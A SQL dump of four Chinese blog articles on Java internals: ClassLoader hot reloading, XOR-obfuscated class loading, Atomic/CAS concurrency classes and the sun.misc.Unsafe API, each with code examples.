INSERT INTO `article` VALUES (107, 1, 'ClassLoader实现热加载', '2019/10/1570610235_mmexport1570610135095.jpg', '### 实现热加载\n#### 什么是热加载\n1. 对于Java应用程序来说,热加载就是在运行时更新Java类文件\n2. 单纯替换Class文件是无法热加载的,因为默认类加载器只加载一次,且执行前需要GC回收\n3. 分布式场景下热加载(部署)使用配置中心实现\n4便于开发环境,避免频繁重启,避免浪费琐碎时间\n5. 热加载导致的频繁读写会严重消耗资源,对性能有影响\n\n#### 准备两份版本class文件\n```java\npublic class User {\n    // 运行目录的class反编译为v1.0\n    public void run() {\n        System.out.println(\"v1.0\");\n    }\n}\n```\n```java\npublic class User {\n    // 运行目录的class反编译为v1.0\n    public void run() {\n        System.out.println(\"v2.0\");\n    }\n}\n```\n1. 定义一个User,分两个版本v1.0和v2.0,两份class文件,采用jd-gui反编译工具查看代码\n2. v1.0版本为当前运行目录的class文件,放在ide的target目录下\n3. v2.0版本放在预备目录F:\\dirtest中的\n\n#### 测试,错误的方式直接替换文件\n```java\npublic class Hotswap {\n    public static void main(String[] args) throws Exception {\n        User user = new User();\n        // v1.0\n        user.run();\n        Thread.sleep(10 * 1000);\n        // 理应是v2.0,但实际打印v1.0\n        user.run();\n    }\n}\n```\n1. 运行后,在线程睡眠的15秒时间中将F:\\dirtest中的v2.0版本替换到ide的target目录目标v1.0版本的class文件(手动)\n2. 15秒后,打印结果两次依然是v1.0\n3. 虽然v2.0版本将v1.0的class文件已替换,但没有成功.原因就是因为默认类加载器只加载一次\n\n#### 定义自定义的ClassLoader\n```java\n/**\n * classLoader\n * @author tuwq\n */\npublic class MyClassLoader extends ClassLoader {\n    /**\n     * 获取文件名称\n     * 读取文件流\n     * 读取byte数组给jvm\n     */\n    @Override\n    protected Class<?> findClass(String name) throws ClassNotFoundException {\n        try {\n            String fileName = name.substring(name.lastIndexOf(\".\") + 1) + \".class\";\n            InputStream is = this.getClass().getResourceAsStream(fileName);\n            byte[] bytes = new byte[is.available()];\n            is.read(bytes);\n            return defineClass(name, bytes, 0, bytes.length);\n        } catch (IOException e) {\n            e.printStackTrace();\n            throw new ClassNotFoundException(); \n        }\n    }\n \n```\n#### 测试,成功的加载两次类\n```java\n/**\n * 热加载\n * @author tuwq\n */\npublic class Hotswap {\n\n    /**\n     * 第一次是v1.0\n     * v2.0版本将v1.0版本进行替换\n     * 第二次是v2.0\n     * @param args\n     * @throws Exception\n     */\n    public static void main(String[] args) throws Exception {\n        loadUser();\n        System.gc();\n        File file1 = new File(\"F:\\\\dirtest\\\\User.class\");\n        File file2 = new File(\"D:\\\\eclipse-workspace\\\\classloader\\\\target\\\\classes\\\\root\\\\classloader\\\\User.class\");\n        boolean isDel = file2.delete();\n        if(!isDel) { System.out.println(\"热加载失败\"); return;}\n        file1.renameTo(file2);\n        Thread.sleep(15 * 1000);\n        loadUser();\n    }\n\n    /**\n     * 类加载器读取信息\n     * @throws Exception\n     */\n    public static void loadUser() throws Exception {\n        MyClassLoader myClassLoader = new MyClassLoader();\n        Class<?> findClass = myClassLoader.findClass(\"root.classloader.User\");\n\n        Object newInstance = findClass.newInstance();\n        Method method = findClass.getMethod(\"run\");\n        method.invoke(newInstance);\n        System.out.println(newInstance.getClass());\n        System.out.println(newInstance.getClass().getClassLoader());\n    }\n}\n```\n1. 运行后,在线程睡眠的15秒时间中提醒GC进行回收,并将F:\\dirtest中的v2.0版本替换到ide的target目录目标v1.0版本的class文件(自动)\n2. 依靠自定义的类加载器进行对class文件再次加载,此时读取的就是已替换的v2.0版本\n3. 反射打印是v2.0,整个过程无需重启程序,证明热加载成功 \n4. 采用系统应用(App)加载器重新加载也可以实现', 0, 0, 21, 0, 0, '2019-10-09 16:37:22', '2019-10-16 20:33:51', 0, 0);
INSERT INTO `article` VALUES (108, 1, 'ClassLoader实现Class文件的加解密', '2019/10/1570611093_mmexport1570610069620.jpg', '### 实现对Class文件的加解密加载\n#### 为什么要加解密Class\n1. 某些代码不想让随意看见,需要进行一些加密,增加一些反编译难度\n2. 被加密的class文件无法被正常的运行和验证\n\n#### 对文件进行加密工具类\n```java\npublic final class EncryptUtils {\n    public static final byte ENCRYPT_FACTOR = (byte) 0xff;\n\n    private EncryptUtils() {\n    }\n\n    public static void doEncrypt(String source, String target) {\n        try(FileInputStream fis = new FileInputStream(source);\n            FileOutputStream fos = new FileOutputStream(target)) {\n            int data;\n            while ((data = fis.read())!= -1) {\n                // 简单的异或加密 异或两次恢复原状 一次异或加密 第二次异或解密\n                fos.write(data ^ ENCRYPT_FACTOR);\n            }\n        } catch (FileNotFoundException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        doEncrypt(\"E:\\\\databak\\\\classloader1\\\\com\\\\tuwq\\\\stage1\\\\SimpleObject.class\",\n                \"E:\\\\databak\\\\classloader2\\\\com\\\\tuwq\\\\stage1\\\\SimpleObject.class\");\n    }\n}\n```\n#### 自定义解密ClassLoader\n```java\npublic class DecryptClassLoader extends ClassLoader {\n\n    public static final byte ENCRYPT_FACTOR = (byte) 0xff;\n\n    private final static String DEFAULT_DIR = \"E:\\\\databak\\\\classloader1\";\n\n    private String dir = DEFAULT_DIR;\n\n    public DecryptClassLoader() {\n        super();\n    }\n\n    public DecryptClassLoader(ClassLoader parent) {\n        super(parent);\n    }\n\n    @Override\n    protected Class<?> findClass(String name)\n            throws ClassNotFoundException {\n        String classPath = name.replace(\".\", \"/\");\n        File classFile = new File(dir, classPath + \".class\");\n\n        if (!classFile.exists()) {\n            throw new ClassNotFoundException(\"The class \" + name + \" not found under directory [\" + dir + \"]\");\n        }\n        byte[] classBytes = loadClassByte(classFile);\n        if (null == classBytes || classBytes.length == 0) {\n            throw new ClassNotFoundException(\"load the class \" + name + \" failed\");\n        }\n        return this.defineClass(name, classBytes, 0, classBytes.length);\n    }\n\n    private byte[] loadClassByte(File classFile) {\n        try(ByteArrayOutputStream baos = new ByteArrayOutputStream();\n            FileInputStream fis = new FileInputStream(classFile)\n        ) {\n            int data;\n            while ((data = fis.read())!=-1) {\n				// 再一次异或,进行解密\n                baos.write(data ^ ENCRYPT_FACTOR);\n            }\n            baos.flush();\n            return baos.toByteArray();\n        } catch (IOException e) {\n            return null;\n        }\n    }\n\n    public void setDir(String dir) {\n        this.dir = dir;\n    }\n}\n```\n#### 测试\n```java\npublic class ClassLoaderTest {\n    public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException {\n        // MyClassLoader classLoader = new MyClassLoader();\n        DecryptClassLoader classLoader = new DecryptClassLoader();\n        classLoader.setDir(\"E:\\\\databak\\\\classloader2\");\n        Class<?> aClass = classLoader.loadClass(\"com.tuwq.stage1.SimpleObject\");\n        System.out.println(aClass);\n    }\n}\n```', 0, 0, 20, 0, 0, '2019-10-09 16:51:39', '2019-10-09 17:33:02', 0, 0);
INSERT INTO `article` VALUES (109, 1, 'Atomic-JUC', '2019/10/1570959667_mmexport1570957680626.jpg', '### Atomic\n#### Atomic是什么\n1. jdk8提供的原子性包,解决线程安全问题\n2. 采用了unsafe提供的CAS算法,也就是CPU级别的同步指令,汇编指令(cmp),相当于乐观锁,它可以探测到其他线程对共享线程的变化情况\n\n#### CAS算法是什么\n1. 与锁相比,使用比较交换(下文简称CAS),会使得程序看起来更加复杂一些,但由于其非阻塞性,它对死锁问题天生免疫\n2. 线程间的相互影响也远远比基于锁的方式要小,更为重要的是,使用无锁的方式完全没有锁竞争带来的系统开销,也没有线程间频繁调度带来的开销,因此,它要比基于锁的方式拥有更优越的性能\n\n#### CAS算法怎么实现\n1. CAS就是乐观锁思想的实现,相对于比对版本号,CAS则是比对本地内存的预期值 \n2. V: 需要更新变量 (主内存),E: 预期值 (本地内存),N: 新值\n3. 如果V = E(主内存值与本地内存一致),说明没有修改过,将V的值设置为N\n4. 如果V != E(主内存值与本地内存值不一致),说明已经被修改,重新刷新主内存至本地内存,不断循环进行比较直到V = E,将V设置为N\n5. 采用unsafe类对应汇编指令如compareAndSwapLong ->cmpchg, compareAndSwapObject ->cmpchgq,putOrderedInt ->xchg1\n\n### Atomic基本类型,数组类型与引用类型\n#### AtomicInteger\n```java\n/**\n * 并发保证原子性与可序性\n */\npublic class AtomicIntegerTest2 {\n\n    private static Set<Integer> set = Collections.synchronizedSet(new HashSet<Integer>());\n\n    public static void main(String[] args) throws InterruptedException {\n        final AtomicInteger value = new AtomicInteger();\n        Thread t1 = new Thread() {\n            @Override\n            public void run() {\n                int x = 0;\n                while (x < 500) {\n                    int v = value.getAndIncrement();\n                    set.add(v);\n                    System.out.println(Thread.currentThread().getName() + \":\" + v);\n                    x++; }\n            }\n        };\n        Thread t2 = new Thread() {\n            @Override\n            public void run() {\n                int x = 0;\n                while (x < 500) {\n                    int v = value.getAndIncrement();\n                    set.add(v);\n                    System.out.println(Thread.currentThread().getName() + \":\" + v);\n                    x++; }\n            }\n        };\n        Thread t3 = new Thread() {\n            @Override\n            public void run() {\n                int x = 0;\n                while (x < 500) {\n                    int v = value.getAndIncrement();\n                    set.add(v);\n                    System.out.println(Thread.currentThread().getName() + \":\" + v);\n                    x++; }\n            }\n        };\n        t1.start();t2.start();t3.start();\n        t1.join();t2.join();t3.join();\n        System.out.println(set.size());\n    }\n}\n```\n```java\n/**\n * 充当同步锁\n */\npublic class CompareAndSetLock {\n\n    private final AtomicInteger value = new AtomicInteger(0);\n\n    private Thread lockThread;\n\n    public void tryLock() throws GetLockException {\n        boolean success = value.compareAndSet(0, 1);\n        if (!success) {\n            throw new GetLockException(\"Get the Lock failed\");\n        } else {\n            lockThread = Thread.currentThread();\n        }\n    }\n\n    public void unlock() {\n        if (0 == value.get()) {\n            return;\n        }\n        if (lockThread == Thread.currentThread()) {\n            value.compareAndSet(1, 0);\n        }\n    }\n} \n```\n#### AtomicBoolean\n```java\n/**\n * 充当标志位\n */\npublic class AtomicBooleanFlag {\n\n    // private static volatile  boolean flag = true;\n    // 替代volatile并保证原子性\n    private final static AtomicBoolean flag = new AtomicBoolean(true);\n\n    public static void main(String[] args) throws InterruptedException {\n        new Thread() {\n            @Override\n            public void run() {\n                while(flag.get()) {\n                    try {\n                        Thread.sleep(1_000);\n                        System.out.println(\"I am working.\");\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    }\n                }\n                System.out.println(\"I am finished\");\n            }\n        }.start();\n        Thread.sleep(5_000);\n        flag.set(false);\n    }\n}\n```\n#### AtomicLong\n```java\n// AtomicLong使用方式与AtomicInteger一致\n// 但是AtomicLong出现了下面的代码\nstatic final boolean VM_SUPPORTS_LONG_CAS = VMSupportsCS8();\nprivate static native boolean VMSupportsCS8();\n\n// 它们的作用是查看CPU是否支持无锁机制\n// 因为long 64(high 32+low  32) long类型有高低位,需要两次运算,需要保证原子性\n// VMSupportsCS8 true支持时使用cmp指令操作\n// VMSupportsCS8 false不支持时数据总线加锁\n```\n\n#### AtomicIntegerArray\n```java\n/**\n * AtomicIntegerArray使用方式\n */\npublic class AtomicIntegerArrayTest {\n\n    @Test\n    public void testCreateAtomicIntegerArray() {\n        AtomicIntegerArray array = new AtomicIntegerArray(10);\n        System.out.println(array.length()); // 10\n    }\n\n    @Test\n    public void testGet() {\n        AtomicIntegerArray array = new AtomicIntegerArray(10);\n        System.out.println(array.length()); // 10\n        System.out.println(array.get(5)); // 0\n    }\n\n    @Test\n    public void testSet() {\n        AtomicIntegerArray array = new AtomicIntegerArray(10);\n        array.set(5, 5);\n        System.out.println(array.length()); //10\n        System.out.println(array.get(5));// 5\n    }\n\n    @Test\n    public void testGetAndSet() {\n        int[] originalArray = new int[10];\n        originalArray[5] = 5;\n        AtomicIntegerArray array = new AtomicIntegerArray(originalArray);\n        int v = array.getAndSet(5, 6);\n        System.out.println(v); // 5\n        System.out.println(array.get(5));// 6\n    }\n}\n```\n\n#### AtomicReference\n```java\n/**\n * 使用方式\n */\npublic class AtomicReferenceTest {\n    public static void main(String[] args) {\n        // 基本使用\n        AtomicReference<Simple> atomic = new AtomicReference<>(new Simple(\"Alex\", 123));\n        System.out.println(atomic.get());\n\n        boolean success = atomic.compareAndSet(new Simple(\"sdfs\", 22), new Simple(\"sdf\", 23));\n        System.out.println(success);\n\n        JButton button = new JButton();\n        // default 多线程之外的应用场景 使用在匿名内部类中\n        // Simple s = new Simple(\"t\", 12);\n        final AtomicReference<Simple> s = new AtomicReference(new Simple(\"t\", 12));\n        button.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                // invoke restful service\n                // s = new Simple(\"qwe\", 123);\n                s.set(new Simple(\"qwe\", 123));\n            }\n        });\n    }\n\n    static class Simple {\n        private String name;\n        private int age;\n\n        public Simple(String name, int age) {\n            this.name = name;\n            this.age = age;\n        }\n\n        public String getName() {\n            return name;\n        }\n\n        public int getAge() {\n            return age;\n        }\n    }\n}\n```\n### AtomicStampedReference解决ABA问题\n#### CAS缺点,ABA问题\n1. ABA问题它是指在CAS操作的时候,其他线程将变量的值A改成了B但是又改回了A,本线程使用期望值A与当前变量进行比较的时候,发现A变量没有变,于是CAS就将A值进行交换操作\n2. 这个时候实际上该值已经被其他线程改变过,这与设计思想是不符合的,因此ABA问题的解决思路,每次变量更新的时候把变量的版本号加一,那么之前那个A改为B改为A变为A1是1版本,B是2版本,A2是3版本,这时,只要变量被线程修改过,该变量对应的版本号就会发生递增变化,从而解决了ABA问题\n3. Java并发包中提供一个带有标记的原子引用类AtomicStampedReference,它可以通过控制变量值的版本来保证CAS的正确性\n\n#### AtomicStampedReference\n```java\n/**\n * AtomicStampedReference解决ABA问题\n */\npublic class AtomicStampedReferenceTest {\n\n    private static AtomicStampedReference<Integer> atomicStampedReference = new AtomicStampedReference<>(100, 0);\n\n    public static void main(String[] args) throws InterruptedException {\n        Thread t1 = new Thread(()->{\n            try {\n                TimeUnit.SECONDS.sleep(1);\n                boolean success = atomicStampedReference.compareAndSet(100, 101, atomicStampedReference.getStamp(), atomicStampedReference.getStamp()+1);\n                System.out.println(success);\n                success = atomicStampedReference.compareAndSet(101, 100, atomicStampedReference.getStamp(), atomicStampedReference.getStamp()+1);\n                System.out.println(success);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        });\n\n        Thread t2 = new Thread(()->{\n            try {\n                int stamp = atomicStampedReference.getStamp();\n                System.out.println(\"Before sleep: stamp=\" + stamp); // 0\n                TimeUnit.SECONDS.sleep(2);\n                boolean success = atomicStampedReference.compareAndSet(100, 101, stamp, stamp+1);\n                System.out.println(success); // false\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        });\n        t1.start();\n        t2.start();\n        t1.join();\n        t2.join();\n    }\n}\n```\n### AtomicXXXFieldUpdater 字段更新\n#### AtomicIntegerFieldUpdater\n```java\npublic class AIFUTest {\n    private volatile int i;\n\n    private AtomicIntegerFieldUpdater<AIFUTest> updater = AtomicIntegerFieldUpdater.<AIFUTest>newUpdater(AIFUTest.class, \"i\");\n\n    public void update(int newValue) {\n        updater.compareAndSet(this, i, newValue);\n    }\n\n    public int get() {\n        return i;\n    }\n\n    public static void main(String[] args) {\n        AIFUTest test = new AIFUTest();\n        test.update(10);\n        System.out.println(test.get());\n    }\n}\n```\n```java\npublic class AtomicIntegerFieldUpdateTest {\n\n    public static void main(String[] args) {\n        final AtomicIntegerFieldUpdater<TestMe> updater = AtomicIntegerFieldUpdater.newUpdater(TestMe.class, \"i\");\n        final TestMe me = new TestMe();\n        for(int i = 0; i < 2; i++) {\n            new Thread() {\n                @Override\n                public void run() {\n                    final int MAX = 20;\n                    for (int j = 0; j < MAX; j++) {\n                        int v = updater.getAndIncrement(me);\n                        System.out.println(Thread.currentThread().getName() + \"=>\" + v);\n                    }\n                }\n            }.start();\n        }\n    }\n\n    static class TestMe {\n        volatile int i;\n    }\n}\n```\n#### AtomicReferenceFieldUpdater\n```java\n	@Test\n    public void testFieldReference() {\n        AtomicReferenceFieldUpdater<TestMe2, Integer> updater = AtomicReferenceFieldUpdater.newUpdater(TestMe2.class, Integer.class, \"i\");\n        TestMe2 me = new TestMe2();\n        updater.compareAndSet(me, null, 1);\n        System.out.println(me.i);\n    }\n\n    static class TestMe2 {\n        volatile Integer i;\n    }\n```\n#### AtomicXXXFieldUpdater使用场景\n1. 想让类的属性操作具备原子性,volatile,非private,protected(如果当前类也可以是private,protected),类型必须一致\n2. 不想使用锁(包含显式锁或重量级锁synchronized)\n3. 大量需要原子类型修饰的对象,相比较耗费内存,而使用FieldUpdater可以节省大量内存', 0, 0, 23, 0, 0, '2019-10-13 17:41:14', '2019-10-13 20:07:07', 0, 0);
INSERT INTO `article` VALUES (110, 1, 'Unsafe类使用', '2019/10/1570968721_mmexport1570957729880.jpg', '### Unsafe\n#### Unsafe是什么\n1. Java是安全的编程语言，会阻止程序员犯很多愚蠢的错误，其中大部分基于内存管理。\n2. 但是，有一种方法可以有意地犯这样的错误,使用不安全的类\n3. 该类提供了普通读写,volatile读写,有序性读写,有序写入,直接内存操作,CAS相关,属性偏移量相关,线程调度,类加载,内存屏障\n\n### Unsafe的API\n#### 获取Unsafe\n```java\n	// Unsafe无法直接使用,需要通过反射获取\n	private static Unsafe getUnsafe() {\n        try {\n            Field f = Unsafe.class.getDeclaredField(\"theUnsafe\");\n            f.setAccessible(true);\n            return (Unsafe)f.get(null);\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n```\n\n#### 直接内存操作\n```java\n// Java不可以直接对内存进行操作，对象内存的分配和回收都是由JVM帮助我们实现的。\n// 但是Unsafe为我们在Java中提供了直接操作内存的能力\n// 分配内存\npublic native long allocateMemory(long var1);\n// 重新分配内存\npublic native long reallocateMemory(long var1, long var3);\n// 内存初始化\npublic native void setMemory(long var1, long var3, byte var5);\n// 内存复制\npublic native void copyMemory(Object var1, long var2, Object var4, long var5, long var7);\n// 清除内存\npublic native void freeMemory(long var1); \n```\n#### CAS相关\n```java\n// JUC中大量运用了CAS操作，可以说CAS操作是JUC的基础，因此CAS操作是非常重要的。\n// Unsafe中提供了int,long和Object的CAS操作\npublic final native boolean compareAndSwapObject(Object var1, long var2, Object var4, Object var5);\n\npublic final native boolean compareAndSwapInt(Object var1, long var2, int var4, int var5);\n\npublic final native boolean compareAndSwapLong(Object var1, long var2, long var4, long var6);\n```\n#### 属性偏移量相关\n```java\npublic native long staticFieldOffset(Field var1);\n\npublic native long objectFieldOffset(Field var1);\n\npublic native Object staticFieldBase(Field var1);\n\npublic native int arrayBaseOffset(Class<?> var1);\n\npublic native int arrayIndexScale(Class<?> var1);\n```\n1. staticFieldOffset方法: 用于获取静态属性Field在对象中的偏移量，读写静态属性时必须获取其偏移量\n2. objectFieldOffset方法: 用于获取非静态属性Field在对象实例中的偏移量，读写对象的非静态属性时会用到这个偏移量\n3. staticFieldBase方法: 用于返回Field所在的对象\n4. arrayBaseOffset方法: 用于返回数组中第一个元素实际地址相对整个数组对象的地址的偏移量\n5. arrayIndexScale方法: 用于计算数组中第一个元素所占用的内存空间\n\n#### 普通读写\n```java\n// 通过Unsafe可以读写一个类的属性，即使这个属性是私有的，也可以对这个属性进行读写\npublic native int getInt(Object var1, long var2);\n\npublic native void putInt(Object var1, long var2, int var4);\n\n// Unsafe还可以直接在一个地址上读写\npublic native byte getByte(long var1);\n\npublic native void putByte(long var1, byte var3);\n```\n1. getInt: 用于从对象的指定偏移地址处读取一个int\n2. putInt: 用于在对象指定偏移地址处写入一个int。其他的primitive type也有对应的方法\n\n#### 有序性写入\n```java\n// 有序写入只保证写入的有序性，不保证可见性，就是说一个线程的写入不保证其他线程立马可见\npublic native void putOrderedObject(Object var1, long var2, Object var4);\n\npublic native void putOrderedInt(Object var1, long var2, int var4);\n\npublic native void putOrderedLong(Object var1, long var2, long var4);\n```\n\n#### volatile读写\n```java\n// 普通的读写无法保证可见性和有序性，而volatile读写就可以保证\n可见性和有序性。\n// volatile读写相对普通读写是更加昂贵的，因为需要保证可见性和有序性，\n// 而与volatile写入相比putOrderedXX写入代价相对较低，putOrderedXX写入不保证可见性，但是保证有序性，所谓有序性，就是保证指令不会重排序\npublic native int getIntVolatile(Object var1, long var2);\n\npublic native void putIntVolatile(Object var1, long var2, int var4);\n```\n1. getIntVolatile方法: 用于在对象指定偏移地址处volatile读取一个int\n2. putIntVolatile方法: 用于在对象指定偏移地址处volatile写入一个int\n\n#### 线程调度\n```java\n// park方法和unpark方法相信看过LockSupport类的都不会陌生，这两个方法主要用来挂起和唤醒线程。LockSupport中的park和unpark方法正是通过Unsafe来实现的：\npublic native void unpark(Object var1);\n\npublic native void park(boolean var1, long var2);\n\npublic native void monitorEnter(Object var1);\n\npublic native void monitorExit(Object var1);\n\npublic native boolean tryMonitorEnter(Object var1);\n```\n\n```java\n// monitorEnter方法和monitorExit方法用于加锁，Java中的synchronized锁就是通过这两个指令来实现的。\n// 挂起线程\npublic static void park(Object blocker) {\n    Thread t = Thread.currentThread();\n    setBlocker(t, blocker); // 通过Unsafe的putObject方法设置阻塞阻塞当前线程的blocker\n    UNSAFE.park(false, 0L); // 通过Unsafe的park方法来阻塞当前线程，注意此方法将当前线程阻塞后，当前线程就不会继续往下走了，直到其他线程unpark此线程\n    setBlocker(t, null); // 清除blocker\n}\n\n// 唤醒线程\npublic static void unpark(Thread thread) {\n    if (thread != null)\n        UNSAFE.unpark(thread);\n}\n```\n#### 类加载\n```java\npublic native Class<?> defineClass(String var1, byte[] var2, int var3, int var4, ClassLoader var5, ProtectionDomain var6);\n\npublic native Class<?> defineAnonymousClass(Class<?> var1, byte[] var2, Object[] var3);\n\npublic native Object allocateInstance(Class<?> var1) throws InstantiationException;\n\npublic native boolean shouldBeInitialized(Class<?> var1);\n\npublic native void ensureClassInitialized(Class<?> var1);\n```\n1. defineClass方法: 定义一个类，用于动态地创建类。\n2. defineAnonymousClass方法: 用于动态的创建一个匿名内部类。\n3. allocateInstance方法: 用于创建一个类的实例，但是不会调用这个实例的构造方法，如果这个类还未被初始化，则初始化这个类。\n4. shouldBeInitialized方法: 用于判断是否需要初始化一个类。\n5. ensureClassInitialized方法: 用于保证已经初始化过一个类。\n\n#### 内存屏障\n```java\npublic native void loadFence();\n\npublic native void storeFence();\n\npublic native void fullFence();\n```\n1. loadFence：保证在这个屏障之前的所有读操作都已经完成。\n2. storeFence：保证在这个屏障之前的所有写操作都已经完成。\n3. fullFence：保证在这个屏障之前的所有读写操作都已经完成。\n\n### 使用示例\n#### 数字原子性叠加\n```java\npublic class UnsafeExample1 {\n    private static Unsafe getUnsafe() {\n        try {\n            Field f = Unsafe.class.getDeclaredField(\"theUnsafe\");\n            f.setAccessible(true);\n            return (Unsafe)f.get(null);\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        ExecutorService service = Executors.newFixedThreadPool(10);\n        Counter counter = new CasCounter();\n        long start = System.currentTimeMillis();\n        for (int i = 0; i < 1000; i++) {\n            service.submit(new CounterRunnable(counter, 10_000));\n        }\n        service.shutdown();\n        service.awaitTermination(1, TimeUnit.HOURS);\n        long end = System.currentTimeMillis();\n\n        System.out.println(\"Counter result;\" + counter.getCounter());\n        System.out.println(\"Time passed in ms:\" + (end - start));\n    }\n\n    interface Counter {\n        void increment();\n\n        long getCounter();\n    }\n\n    static class CasCounter implements Counter {\n        private volatile long counter = 0;\n        private Unsafe unsafe;\n        private long offset;\n\n        CasCounter() throws Exception {\n            // 获取unsafe\n            unsafe = getUnsafe();\n            // 获取CasCounter类的非静态属性counter偏移量\n            offset = unsafe.objectFieldOffset(CasCounter.class.getDeclaredField(\"counter\"));\n        }\n\n        @Override\n        public void increment() {\n            long current = counter;\n            // 进行CAS操作,改变值\n            while (!unsafe.compareAndSwapLong(this, offset, current, current+1)) {\n                current = counter;\n            }\n        }\n\n        @Override\n        public long getCounter() {\n            return counter;\n        }\n    }\n\n    static class CounterRunnable implements Runnable {\n        private Counter counter;\n        private int num;\n\n        CounterRunnable(Counter counter, int num) {\n            this.counter = counter;\n            this.num = num;\n        }\n\n        @Override\n        public void run() {\n            for (int i = 0; i < num; i++) {\n                counter.increment();\n            }\n        }\n    }\n}\n```\n#### allocateInstance不会执行构造器\n```java\npublic class UnsafeExample2 {\n    private static Unsafe getUnsafe() {\n        try {\n            Field f = Unsafe.class.getDeclaredField(\"theUnsafe\");\n            f.setAccessible(true);\n            return (Unsafe)f.get(null);\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public static void main(String[] args) throws InstantiationException {\n        Unsafe unsafe = getUnsafe();\n        // 不会进入构造函数初始化\n        Simple simple = (Simple)unsafe.allocateInstance(Simple.class);\n    }\n\n    static class Simple {\n        private long l = 0;\n        private int i = 10;\n        private byte b = (byte)0x01;\n        public Simple() {\n            this.l = 1;\n            System.out.println(\"=========\");\n        }\n        public long get() {\n            return this.l;\n        }\n    }\n}\n```\n#### 修改对象实例属性值\n```java\npublic class UnsafeExample3 {\n    private static Unsafe getUnsafe() {\n        try {\n            Field f = Unsafe.class.getDeclaredField(\"theUnsafe\");\n            f.setAccessible(true);\n            return (Unsafe)f.get(null);\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public static void main(String[] args) throws NoSuchFieldException {\n        Unsafe unsafe = getUnsafe();\n        // 修改对象实例属性值\n        Guard guard = new Guard();\n        Field f = guard.getClass().getDeclaredField(\"ACCESS_ALLOWED\");\n        unsafe.putInt(guard, unsafe.objectFieldOffset(f), 42);\n        guard.work();\n    }\n\n    static class Guard {\n        private int ACCESS_ALLOWED = 1;\n        public boolean allow() {\n            return 42 == ACCESS_ALLOWED;\n        }\n        public void work() {\n            if (allow()) {\n                System.out.println(\"I am working by allowed\");\n            }\n        }\n    }\n}\n```\n#### 加载类文件\n```java\npublic class UnsafeExample4 {\n    private static Unsafe getUnsafe() {\n        try {\n            Field f = Unsafe.class.getDeclaredField(\"theUnsafe\");\n            f.setAccessible(true);\n            return (Unsafe)f.get(null);\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n    public static void main(String[] args) throws Exception {\n        Unsafe unsafe = getUnsafe();\n        // 加载类文件\n        byte[] bytes = loadClassContent();\n        Class<?> aClass = unsafe.defineClass(null, bytes, 0, bytes.length, ClassLoader.getSystemClassLoader(), null);\n        int v = (int) aClass.getMethod(\"get\").invoke(aClass.newInstance(), null);\n        System.out.println(v);\n    }\n\n    private static byte[] loadClassContent() throws IOException {\n        File f = new File(\"E:\\\\databak\\\\A.class\");\n        FileInputStream fis = new FileInputStream(f);\n        byte[] content = new byte[(int)f.length()];\n        fis.read(content);\n        fis.close();\n        return content;\n    }\n}\n// 需要被加载的class文件代码\npublic class A {\n    private int i = 0;\n\n    public A() {\n        this.i = 1;\n    }\n\n    public int get() {\n        return i;\n    }\n}\n```\n#### 获取对象所占大小,像C的sizeof那样\n```java\npublic class UnsafeExample5 {\n    private static Unsafe getUnsafe() {\n        try {\n            Field f = Unsafe.class.getDeclaredField(\"theUnsafe\");\n            f.setAccessible(true);\n            return (Unsafe)f.get(null);\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public static void main(String[] args) {\n        System.out.println(sizeof(new Simple()));\n    }\n\n    private static long sizeof(Object obj) {\n        Unsafe unsafe = getUnsafe();\n        Set<Field> fields = new HashSet<>();\n        Class c = obj.getClass();\n        while (c != Object.class) {\n            Field[] declaredFields = c.getDeclaredFields();\n            for(Field f : declaredFields) {\n                // 不是静态属性,添加\n                if ((f.getModifiers() & Modifier.STATIC) == 0) {\n                    fields.add(f);\n                }\n            }\n            c = c.getSuperclass();\n        }\n        long maxOffSet = 0;\n        for (Field f: fields) {\n            long offSet = unsafe.objectFieldOffset(f);\n            if (offSet > maxOffSet) {\n                maxOffSet = offSet;\n                System.out.println(\"type:\" + f.getType());\n                System.out.println(\"max:\" + maxOffSet);\n            }\n        }\n        return (( maxOffSet / 8 ) + 1) * 8;\n    }\n\n    static class Simple {\n        private long l = 0;\n        private int i = 10;\n        private byte b = (byte)0x01;\n        public Simple() {\n            this.l = 1;\n            System.out.println(\"=========\");\n        }\n        public long get() {\n            return this.l;\n        }\n    }\n}\n```', 0, 0, 30, 0, 0, '2019-10-13 20:12:09', '2019-10-13 21:22:42', 0, 0);
